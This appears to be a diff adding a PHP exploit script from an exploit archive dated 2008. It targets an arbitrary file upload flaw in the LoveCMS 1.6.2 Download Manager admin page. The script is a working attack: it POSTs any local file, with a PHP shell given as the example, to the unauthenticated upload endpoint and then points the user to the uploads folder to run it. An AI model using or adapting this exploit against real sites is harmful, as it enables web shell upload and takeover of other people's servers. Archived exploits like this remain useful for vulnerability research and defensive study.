@@ -1,0 +1,48 @@
+<?php
+
+/**
+* LoveCMS 1.6.2 Final (Download Manager v1.0) Arbitrary File Upload Exploit
+* Discovered && Exploited by cOndemned
+*
+* Download:
+*	http://www.thethinkingman.net/modules/download_manager/?id=16
+*
+* Description:
+*	This exploit allows attacker to upload any type of file [no extension
+*	filtration] ex. php shell... 
+*
+*	Uploader is adding random number on the begining of file name so user
+*	have to check it manually.
+*
+*	for more information check /modules/download_manager/admin/index.php
+*	lines 10 - 27.
+*
+* Greetz:
+*	ZaBeaTy, str0ke, Necro, doctor, sid.psycho, 0in, TBH & Avantura...
+*
+*/
+
+	if($argc != 3)
+	{
+		printf("\n[~] Usage: php %s <target> <localfile>\n", $argv[0]);
+		printf("[~] Ex.: php %s localhost/lovecms shell.php\n\n", $argv[0]);
+		exit;	
+	}
+
+	list($script, $target, $file) = $argv;
+
+	$xpl = curl_init();
+
+	curl_setopt($xpl, CURLOPT_URL, $target . '/modules/download_manager/admin/index.php');
+	curl_setopt($xpl, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($xpl, CURLOPT_POST, true);
+	curl_setopt($xpl, CURLOPT_POSTFIELDS, array('file' => '@' . $file, 'submit' => 'Upload'));
+	
+	curl_exec($xpl);
+	curl_close($xpl);
+
+	printf("[!] Go to the %s/uploads/ and check U'r file :)\n\n", $target);
+	
+?>
+
+# milw0rm.com [2008-11-25]
